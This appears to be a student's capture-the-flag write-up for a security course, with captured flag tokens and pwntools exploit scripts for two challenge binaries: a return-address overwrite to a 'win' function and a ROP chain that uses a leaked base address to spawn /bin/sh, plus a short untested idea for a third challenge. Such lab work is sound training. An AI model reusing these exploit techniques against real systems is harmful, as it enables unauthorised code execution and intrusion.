Andrew Wong z5206677

# lol

> FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiZmluYWwtbG9sIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjUxMGFjOTExLWQ2YmMtNGMzMS1hZjdiLWQzYTUxYzVmZGY1ZSJ9.sBq2c41J24uMxXZWNBaeMoqa9JKtJ1s2yFbBH1gvK5Q}

```c
#!/usr/bin/python3

"""
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
"""

binary_path = "./lol"
remote_addr = ('plsdonthaq.me', 1)

#############################
from pwn import *;DEBUG=context.log_level==logging.DEBUG;p=process(binary_path);elf=p.elf;p=remote(*remote_addr) if args["REMOTE"] else p;
#############################

# Exploit

p.recvuntil("Win functions @ ")
func = int(p.recvline(), 16)
log.info(f"Win function at {hex(func)}")
p.sendline(fit({0x4+4: p32(func)}))

p.interactive()
```

# monalisa

FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiZmluYWwtbW9uYWxpc2EiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiZGEzY2FmNTQtMmVmMi00NjI3LThhNjgtOTZhMmFlNmYyYTFiIn0.fVWLJNja2mWk6x8Z-Zq4AhHwFaOjPxYyhK89IOzZCEw}

```c
#!/usr/bin/python3

"""
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
"""

binary_path = "./monalisa"
remote_addr = ('plsdonthaq.me', 2)

#############################
from pwn import *;DEBUG=context.log_level==logging.DEBUG;p=process(binary_path);elf=p.elf;p=remote(*remote_addr) if args["REMOTE"] else p;
#############################

# Exploit

p.recvuntil("want a leak: ")

addr = dict()

elf.address = addr["base"] = int(p.recvline(), 16) - elf.symbols["functions_go_brrrr"]
log.info(f"Base is {hex(addr['base'])}")
addr['binsh'] = next(elf.search(b'/bin/sh'))

payload = b''
payload += b'.' * (0x17 + 4)
payload += p32(0x0000125a + addr["base"])       # mov eax, 0; mov edx, 0; ret; 
payload += p32(0x0000126d + addr["base"]) * 0xb # add eax, 1; ret; 
payload += p32(0x00001022 + addr["base"])       # pop ebx; ret; 
payload += p32(addr['binsh'])
payload += p32(0x00001265 + addr["base"])       # xor ecx, ecx; ret; 
payload += p32(0x0000126a + addr["base"])       # int 0x80;

p.sendline(payload)

p.interactive()
```

# root

Didn't get the flag in time.  
Supplying a negative integer that has an LSB of `0x09` to the program might be possible, since the number would be considered as "below 9".
